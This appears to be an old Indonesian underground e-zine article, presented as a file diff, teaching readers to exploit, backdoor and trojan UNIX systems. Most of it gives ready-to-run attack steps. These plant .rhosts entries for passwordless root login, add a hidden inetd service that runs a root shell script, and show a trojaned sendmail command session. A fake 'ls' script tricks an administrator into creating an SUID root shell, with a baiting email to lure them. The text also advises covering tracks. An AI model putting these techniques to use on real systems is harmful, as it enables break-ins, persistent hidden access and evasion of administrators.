@@ -1,0 +1,310 @@
+Terbitan Online Kecoak Elektronik
+http://k-elektronik.org
+
+
+=====================================================================================
+Eksploit, Trapdoor, Backdoor, dan Trojan Horse
+dijelaskan oleh: Ganjaman dan SuperCock [members of IndoHack]
+=====================================================================================
+
+Artikel ini ditujukan untuk memandu mereka yang masih bingung dengan terminologi sekuritas
+jaringan komputer seperti exploit, trojan, dll dan ingin mengetahui konsep-konsep dasarnya.
+Terimakasih kepada staf kecoak yang bersedia mempublikasikan artikel ini, terutama
+LithiumError dan BigD yang telah memberikan masukan-masukan sangat berguna kepada kami.
+Seperti biasa, ini hanyalah untuk tujuan informasi saja, dan mungkin sysadmin yang membaca
+bisa menggunakan informasi ini untuk melindungi sistem dibawah pengawasan mereka.
+
+Artikel ini berisi metode backdoor/trapdoor dan kode-kode yang bisa langsung diterapkan,
+sebab kami ingin agar para pembaca mengetahui bagaimana * tepatnya * metode ybs bekerja.
+Dan lagi, menyensor informasi bukanlah urusan kami.
+
+1. Eksploit
+===========
+
+Sekarang tentunya kamu sudah asyik bermain-main dan bereksperimen dengan shell UNIX baru yang
+baru kamu 'dapatkan'. Dan mungkin sekarang kamu sudah mulai bertanya-tanya, "apa sih eksploit
+(exploit, 'sploits) itu?". Dalam konteks per-hacking-an, eksploit tidaklah jauh berbeda dengan
+artinya dalam konteks harfiah, yaitu 'pemanfaatan'. Tentunya eksploit-eksploit 'hacking' lebih
+spesifik lagi, yang kurang lebih bisa diartikan sebagai 'pemanfaatan kelemahan dari sebuah
+sistem untuk tujuan-tujuan yang diluar dari penggunaan normal.' Kelemahan-kelemahan ini bisa
+berupa kesalahan pemrograman, sesuatu yang tidak direncanakan oleh pemrogram asli, dan lain-lain.
+
+Umumnya, yang jelas paling menarik perhatian kita, adalah eksploit yang akan memberikan kita
+akses tidak terbatas ke seluruh aspek dari sebuah sistem. Dalam UNIX, sering kita dengar istilah
+'mengeksploit program anu untuk mendapat privilese root'. Tentu saja mendapatkan 'root' bukanlah
+satu-satunya tujuan pengeksploitan sistem. Seperti yang mungkin anda sudah alami sendiri, kadang
+sebuah cacat dalam program seperti maild atau ftpd bisa dimanfaatkan untuk tujuan
+'header forging', 'ip spoofing', 'denial of service attack', dan 'mail bombing'
+(hello, Anton Pardede!).
+ 
+Eksploit secara besar sering dibagi menjadi dua, yaitu eksploit lokal dan eksploit remote.
+Eksploit lokal adalah jenis eksploit yang hanya bisa dijalankan jika kamu sudah punya akses ke
+dalam suatu sistem (baik itu melalui login telnet, ftp, dll). Eksploit jenis ini jumlahnya banyak,
+sebab kamu sudah punya akses ke ribuan program yang berpotensi untuk di-eksploit. Contoh - contoh
+dari eksploit jenis ini adalah buffer overflow (i.e. mh di RedHat 5, SuperProbe, dll), race
+conditions (dimana dua proses saling berlomba untuk menyelesaikan tugas masing-masing, biasanya
+proses A disuruh untuk menjalankan suatu utilitas yang membutuhkan privilese root temporer sementara
+proses B dirancang untuk mencegat proses A sebelum proses A kembali statusnya ke privilese user
+biasa, mengakibatkan di-spawn-nya shell beridentitas root - sering terjadi di mesin-mesin IRIX dan
+SunOS.) Bagaimana caranya agar saya bisa mendapatkan eksploit seperti ini? Tentu saja kamu bisa
+menghabiskan waktu berjam-jam untuk mengutak-utik sebuah program sampai berhasil kamu jebol (lebih
+baik dilakukan di kotak kamu sendiri), seperti para 'elite' lainnya. Biasanya eksploit diprogram
+dengan C, perl, atau sh. Namun kalau ilmu kungfu kamu masih kayak kami (dan emang bawaannya malas),
+banyak eksploit yang sudah didokumentasi dan tersedia melalui websearch, atau di situs-situs tertentu,
+seperti:
+
+http://www.rootshell.com
+http://www.antionline.com
+http://www.rhino9.com
+http://www.dhp.com/~fyodor
+
+atau di situs kecoak, http://k-elektronik.org/arsip/eksploit (*udah mati: editor)
+
+Eksploit jenis satunya lagi adalah eksploit remote, dimana kamu bisa mengeksploit sistem tanpa
+mengetahui otorisasi user/password. Tentu saja eksploit-eksploit jenis ini jauh lebih sedikit
+jumlahnya, dan terkadang dampaknya juga tidak separah eksploit lokal. Lubang cgi phf adalah salah
+satu contoh dari pemanfaatan eksploit remote untuk mendapatkan file /etc/passwd (dulu LithErr pernah
+memberi resep cepat memanfaatkan phf). Mungkin belum terlihat fatal, namun sekalinya sang
+'cracker' berhasil masuk ke dalam sistem memanfaatkan login dan password dari salah seorang user,
+maka dia bisa menjalankan eksploit-eksploit lokal untuk mendapatkan akses tak terbatas milik root.
+
+Eksploit port 143 (IMAPd) malahan lebih gila lagi, dengan memberikan akses root tanpa password.
+Apa trik dan tip yang kira-kira berguna untuk memanfaatkan eksploit-eksploit remote? Jelas sebuah
+portscanner sangatlah bermanfaat untuk melihat port-port mana saja yang menerima koneksi.
+Beberapa jenis 'scanner' lebih terfokus lagi, seperti cgi scanner dari kecoak (roachscan) yang
+saat dijalankan akan memeriksa direktori cgi-bin dari sejumlah server sekaligus, mencari file password
+atau jalan masuk lainnya, melalui beberapa jenis eksploit umum.
+
+Satu program lain yang mungkin ada gunanya adalah 'netcat', bisa didapat dari http://www.l0pht.com
+Untuk menghemat waktu, banyak cracker yang menulis skrip otomasi, jalankan skrip, tinggal berikan
+daftar target-target dan tinggalkan untuk sementara waktu. Kembali lagi sejam atau dua jam kemudian,
+tinggal diperiksa server-server mana saja yang ada lobangnya, bisa dieksploit atau tidak, dll
+(coba lihat artikel-artikel mengenai scanning/probing di situs-situs hacker).
+
+Terkadang ada juga eksploit yang tidak begitu jelas jenisnya, seperti eksploit lynx mailer, yang walaupun
+kodenya sendiri terletak di host lain, namun untuk digunakan masih perlu campurtangan dari user lokal
+untuk bisa bekerja (saat user meng-click sebuah link, sang eksploit akan mengirimkan file password ke
+alamat email tertentu.)
+
+2. Backdoor
+===========
+
+Seperti terjemahan harfiahnya, backdoor bisa dianggap 'pintu masuk lewat belakang'. Backdoor berfungsi
+untuk memberikan sang programmer akses ke suatu sistem, tanpa sepengetahuan user lain ataupun sang
+sysadmin. Tentu saja sang programer di sini bisa juga diartikan 'sang penyusup'. Seringkali backdoor
+memberikan akses tak terbatas kepada siapapun juga yang mengetahui jalan masuknya. Walaupun tidak
+jarang vendor-vendor besar (baik hardware maupun software ) yang sengaja menempatkan backdoor tak
+terdokumentasi untuk kemudahan 'maintenance' dan sejenisnya, dalam artikel ini yang dimaksud adalah
+backdoor dalam artian memberikan akses root ke dalam sebuah sistem UNIX sebagai antisipasi jika sang
+sysadmin kebetulan menyadari bahwa ada penyerang di dalam sistem.
+
+Kamu sudah semalaman begadang, mencoba eksploit-eksploit remote, dan berhasil masuk ke sebuah sistem
+dengan memanfaatkan login user dan segera menjalankan eksploit-eksploit lokal untuk mengambil alih
+kekuasaan root. Tentunya sayang jika saat sang sysadmin kembali bekerja di keesokan harinya, akses kamu
+ditutup. Nah, disinilah manfaatnya kita menanam satu atau lebih jalan masuk 'alternatif'. Jelas, sebagian
+besar teknik-teknik backdooring hanya bisa diterapkan jika kamu mempunyai perizinan root.
+
+Ingat, bahwa tujuan membuat backdoor bukanlah untuk mendapatkan akses root, tetapi untuk mendapatkan akses
+root LAGI setelah sang sysadmin menutup segala jalan masuk normal. Terkadang sysadmin sering menganggap
+selama file-file /etc/hosts.deny telah dikonfigurasi, maka segala koneksi dari host kamu akan ditolak.
+Tentu saja kalian-kalian, sang cracker, kelihaian kung fu nya jauh di atas sang sysadmin, sebab tanpa
+sepengetahuan beliau, telah kamu set up beberapa jalan masuk alternatif dengan privilese root.
+
+Nah, backdoor backdoor ini ada yang memang sudah dari sononya (seperti Backdoor di router-router, printserver,
+dll buatan 3Com), namun disini akan kami jelaskan cara membuat backdoor kamu sendiri di sebuah sistem UNIX.
+Jalan termudah (dan yang paling gampang ditangkap) adalah dengan melalui file /.rhosts:
+
+korban# echo "indohack2.ri.go.id ganjaman" >> /.rhosts
+
+perintah diatas akan menambah satu entri di file .rhosts (sistem luar -dalam contoh diatas user ganjaman
+dari indohack2.ri.go.id - yang boleh mengakses account tanpa password), dan untuk masuk kembali ke
+sistem dari account "ganjaman" di indohack2.ri.go.id :
+
+ganjaman@indohack2> rlogin -l root korban.lameisp.net.id 
+
+poof! shell root tanpa password!
+Untuk kalian yang ingin sedikit lebih tersembunyi lagi, coba perhatikan entri berikut dari file
+/etc/passwd sebuah sistem:
+
+bin:*:3:7:Binaries Command and Source,,,:/bin:/bin/false
+
+tentunya bagi mereka yang sering memanen password entri seperti di atas sudah tidak asing lagi.
+Account diatas adalah account yang digunakan oleh UNIX sistem secara internal. Seringkali banyak diantara
+crackers yang mengambil jalan singkat dan menghapus karakter *, mengakibatkan telnet dengan nama login
+"bin" tidak memerlukan password. Tapi ingatlah bahwa file /etc/passwd biasanya adalah file pertama yang
+akan diperiksa oleh sang sysadmin saat dia menyadari bahwa sistemnya telah kena susup. Agar kita lebih
+sulit dideteksi, maka ada baiknya kita buat file .rhosts di home directory milik bin. Kembali ke entri
+file password diatas, bisa kita lihat bahwa walaupun kita bisa me- rlogin -l bin korban.lameisp.net.id,
+namun kita masih juga tidak bisa mendapatkan shell sebab account 'bin' dikonfigurasikan untuk menolak
+penggunaan shell. Cara mengatasi masalah ini tentunya dengan membuat link dari /bin/false ke /bin/sh atau
+/bin/tcsh. Apa daya seorang sysadmin? Tentunya jika mereka memang keren kung fu nya, sang sysadmin akan
+mensetup sebuah skrip yang memeriksa keberadaan file-file .rhosts di dalam sebuah sistem. Tak lupa merubah
+entri dari account-account internal dari /bin/false ke /nggak-ada-tuh atau string unik lainnya yang bukan
+merupakan nama file.
+
+Metode backdooring lain adalah dengan memanfaatkan "in.rootd" (sebenernya ini hanyalah rekayasa saja,
+sebab sepanjang pengetahuan kami, nggak ada tuh yang namanya root daemon - tapi metode ini benar-benar
+cocok disebut rootd) yang pada dasarnya bertugas untuk membuat sebuah lubang masuk lewat salah satu port yang
+didefinisikan dalam "inetd":
+
+root@korban# echo "ntcp 6969/tcp # Network Traffic Control Protocol" >>
+/etc/services
+root@korban# echo "ntcp stream tcp nowait root /bin/sh sh /tmp/crax0r" >>
+/etc/inetd.conf
+root@korban# echo "echo indohack2.ri.go.id > ~root/.rhosts" > /tmp/crax0r
+
+menjalankan tiga perintah diatas bisa mengakibatkan kompromisasi sistem yang cukup dahsyat, namun tidak
+akan segera tampak. Penjelasan dari ketiga perintah diatas:
+
+1. mengaktifkan protokol ntcp di port 6969 (tentunya kamu memilih nomor port lain yang tidak begitu
+   mencurigakan, silakan pilih mulai dari 1024 sampai 65000-an), sedangkan "Network Traffic Control
+   Protocol" adalah karangan kamu sendiri sebab setiap service harus punya nama, dan biasanya sysadmin
+   tidak akan begitu curiga dengan nama seperti itu.
+
+2. memerintahkan sistem untuk menjalankan perintah /bin/sh sh /tmp/crax0r setiapkali sang sistem menerima
+   koneksi telnet lewat port 6969. Sayangnya mengeksekusi sebuah shell berprivilese root lewat cara ini
+   hanya akan mengakibatkan sang sistem bengong, sebab kita tidak bisa memberikan perintah-perintah selayaknya
+   kita login lewat jalur normal. Sang shell akan tetap dijalankan, namun tidak akan bisa mengeksekusi
+   perintah kita. Untuk itulah kita buat satu skrip di direktori /tmp/crax0r (tentunya kamu lebih pintar dan
+   memilih nama yang tidak begitu mencurigakan seperti /tmp/dev001).
+
+3. Nah, perintah ketiga ini lah yang akan dieksekusi oleh sang shell yang baru saja kita luncurkan
+   (id=0 - root!). Tentunya kamu bisa saja menulis skrip yang lebih kompleks. Namun untuk menghemat tempat,
+   kita lancarkan saja perintah yang sudah dibahas diatas, yaitu menambahkan entri dari mesin host kita ke
+   file .rhosts milik root. Tentu jika sang admin memang keren kung funya, rlogind akan dikonfigurasikan
+   untuk tidak mengindahkan file .rhosts, namun jika kamu periksa isi direktori dan file "history" milik
+   root dan isinya menunjukkan bahwa sang sysadmin tidak begitu melek soal keamanan, maka metode diatas akan
+   memberikan jalan masuk lewat belakang ke dalam sistem target (idih, kesannya kayak cerita-cerita porno
+   anal seks aja!). Sekarang kamu tinggal:
+
+ganjaman@indohack2> telnet korban.lameisp.net.id 6969
+
+nah, sistem kamu akan tersambung ke sistem target lewat port 6969, sedangkan daemon inet di mesin korban
+akan menerima sambungan tersebut, menjalankan perintah dalam skrip /tmp/crax0r dengan privilese root, dan
+dengan segera menutup kembali sambungan telnet. Sekarang .rhosts milik root sudah ditambahi satu entri
+lagi, yaitu nama host kamu. Untuk kembali menggarap sistem target (sebaiknya dilakukan saat itu juga,
+sebab sang sysadmin mungkin akan curiga melihat skrip 'asing' dijalankan lewat port 6969) kamu tinggal:
+
+ganjaman@indohack2> rlogin -l root korban.lameisp.net.id
+
+dan, BOOM!
+
+korban# 
+
+shell root tanpa password! (Nah, sekarang kamu boleh kirim surat penggemar ke indohack@hotmail.com,
+bertitel "Terimakasih, suhu Ganjaman dan SuperCock, atas ilmu ngent engin badannya " :) ).
+Tapi ingatlah untuk segera menghapus file .rhosts dan jejak jejak lain. Tentunya kalau kung fu kamu
+emang udah cukup tinggi, teknik menyembunyikan diri dan antideteksi udah bukan barang asing bagi kamu,
+jadi, jangan lupa aktifkan segala spoofer program, dll. Kalau kamu benar-benar suka mengutak-utik,
+serangan bisa dibuat dengan lebih tersembunyi lagi, seperti dengan memanfaatkan service-service yang
+jarang (hampir tidak pernah dipakai) seperti utilitas-utilitas X, segala utilitas berkepala "r",
+dan banyak lagi.
+
+Metode lain yang cukup populer adalah dengan membuat sebuah file dengan bit SUID tambahan, namun cara
+ini gampang terdeteksi jika kebetulan sistem mempunyai program audit keamanan yang akan mensensus
+seluruh file berbit SUID yang terletak diluar lokasi-lokasi wajar (seperti /tmp atau lokasi homedir
+user). Ide yang lebih mantap lagi adalah dengan memodifikasi suatu program yang sudah berjalan / terinstal
+secara default, seperti xterm dan splitvt, sehingga sebuah option rootshell akan secara otomatis
+execv("/bin/sh", "sh", NULL);.
+
+Kalau kamu emang pendekar asli (dan entah kenapa sedang membaca artikel kelas kacangan ini), kamu
+bisa modifikasi daemon-daemon yang sedang berjalan untuk menerima perintah-perintah hasil karangan
+kamu sendiri. Berikut adalah cuplikan dari metode milik Hacker nagageni 212 yang telah berhasil
+memodifikasi program sendmail di server korban.com (PSM=Pukulan Sinar Matahari):
+
+212@GG> telnet korban.com 25
+Trying mesin.korban.com
+Connected to mesin.korban.com.
+Escape character is '^]'.
+220 mesin.korban.com ESMTP Sendmail 8.8.5/8.8.5; [snip]
+PSM_EXEC /bin/cp /bin/sh /tmp/elit
+Done master!
+PSM_EXEC /bin/chmod 4755 /tmp/elit
+Done master!
+
+Jika menurut kamu cuplikan diatas sudah cukup familiar, maka kami dengan segala kerendahan hati
+minta izin untuk berguru!
+
+3 Trojan Horse
+===============
+
+Tidak akan banyak penjelasan mengenai metode ini, sebab pada umumnya Trojan Horse hanya efektif
+jika kamu betul-betul pintar menutupi suatu program atau jika sang sysadmin memang betul-betul tolol.
+Pada prinsipnya, Trojan Horse adalah program yang mempunyai 'feature' gelap. Misalnya kamu membuat
+sebuah game yang cukup heboh dan kamu dengan sengaja menyelipkan perintah untuk membuka akses di dalam
+kode game kamu, sedemikian rupa sehingga saat sang sysadmin menjalankan program tersebut, tanpa
+disadarinya file .rhosts nya telah ketambahan sesuatu. Kami kenal seorang hacker yang lihai menulis
+skrip IRC, dan skrip IRC-nya kebetulan mempunyai banyak peminat. Beberapa 'lamers' mendownload skrip
+tersebut tanpa menyadari bahwa sang skrip menyelipkan beberapa perintah untuk mengizinkan
+akses tak berpassword kepada sang penulis asli skrip. (Hello, Tut!)
+
+4 Trapdoor
+===========
+Banyak persamaan antara Trapdoor dengan Backdoor dan Trojan Horse, namun dalam artikel ini, 'Trapdoor'
+diasumsikan sebagai cara yang bisa kita gunakan untuk menjebak (trap) sang sysadmin untuk memberikan
+kita akses root kedalam sistem. Seringkali kita terbentur masalah sistem operasi yang paling gres,
+atau sebuah sistem dimana hampir semua eksploit untuk mendapatkan root tidak berjalan sama sekali
+(patched systems). Jangan putus asa! Masih banyak metode yang bisa kita terapkan untuk membuat sang
+sysadmin tertipu, berakibat dibukanya akses ke dalam sistem. Misalkan kamu sudah berhari-hari mengoprek
+sebuah target dengan menggunakan account dan password seorang user biasa hasil colongan lewat phf,
+dan sayangnya tidak ada exploit yang mempan. Nah, sudah saatnya kita terapkan metode Trapdoor.
+
+Berikut adalah metode Trapdoor yang walaupun sederhana, masih saja bisa mengelabui puluhan sysadmin
+diluar sana.
+
+Pertama-tama, kamu perlu merubah perizinan homedir kamu (atau homedir milik user yang accountnya
+kamu 'pinjam'):
+
+user1@korban> chmod 700 ~/.
+
+Nah, karena sekarang homedir kamu bermode 700, sang syadmin perlu mengganti privilesenya ke root jika
+beliau ingin memeriksa isi direktori ybs. Nah, langkah berikutnya adalah membuat sebuah skrip yang
+bertugas untuk bertingkahlaku selayaknya perintah biasa, namun diluar pengetahuan sang admin,
+justru membuka satu (atau beberapa) kelemahan dalam sistem. Yang langsung terpikir olehmu, jelas,
+perintah ls. Disinilah letak kelemahan UNIX dibanding uh, MS-DOS. Dalam UNIX, seorang sysadmin yang
+baik selalu mengetik 'full pathname' dari program manapun yang dia jalankan (seperti /bin/ls atau
+/usr/sbin/vi index.html), dan untuk tujuan kemudahan, biasanya /bin atau /usr/sbin sudah dimasukkan
+dalam daftar search path. Jadi jika misalnya sang sysadmin melakukan:
+
+root# pwd
+/usr/home/staff/user1
+root# ls
+
+maka yang dijalankan adalah program /bin/ls. Apa akibatnya jika kebetulan dalam direktori
+/usr/home/staff/user1 kita letakkan sebuah skrip bernama 'ls'? Heheheh cukup menarik, khan. Nah, sekarang
+kita bisa buat sebuah skrip yang berisi:
+
+#!/bin/sh
+cp /bin/sh /tmp/vi-save-902887
+chown root /tmp/vi-save-902887
+chmod 4755 /tmp/vi-save-902887
+rm ./ls
+ls
+
+simpan skrip tersebut di homedir user1, beri nama "ls" dan
+
+user1@korban> chmod +x ls
+
+sekarang tinggal pintar-pintarnya kamu mengakali sang sysadmin untuk mengecek isi homedir user1.
+Jika kamu kebetulan punya login/passwd untuk user2 di mesin yang sama, maka kamu bisa saja 'mengundang'
+sang admin. Login sebagai user1, dan kirim imel
+
+user1@korban> mail root@localhost
+Subject: "Heheheh Kena garap dari belakang!"
+Hello sysadmin tolol! Mesin kamu sudah kebobolan!
+ttd,
+God of All Hackers, Virus Researchers and Lame Mailbombers,
+Phardera
+.
+
+Saat menerima imel ini, sang Syadmin pun akan segera memeriksa isi homedir user1 (dengan perintah ls,
+tentunya), dan tanpa disadari sang sysadmin telah menciptakan sebuah shell root di /tmp/vi-save-902887.
+Dan, karena vi-save-902887 ber-SUID root, kamu bisa melakukan bermacam-macam hal menyenangkan dengannya.
+Tinggal login sebagai user2 beberapa waktu kemudian, dan nikmati ketenangan pikiran lewat shell root!
+Heheheh.
+
+Penutup
+=======
+
+Begitu dulu, deh, penjelasan dari kami. Semoga ada gunannya untuk kalian semua. Nggak lupa iseng-iseng
+nereakin seluruh kru IndoHack, hackerindo, underground, dan kecoak elektronik!
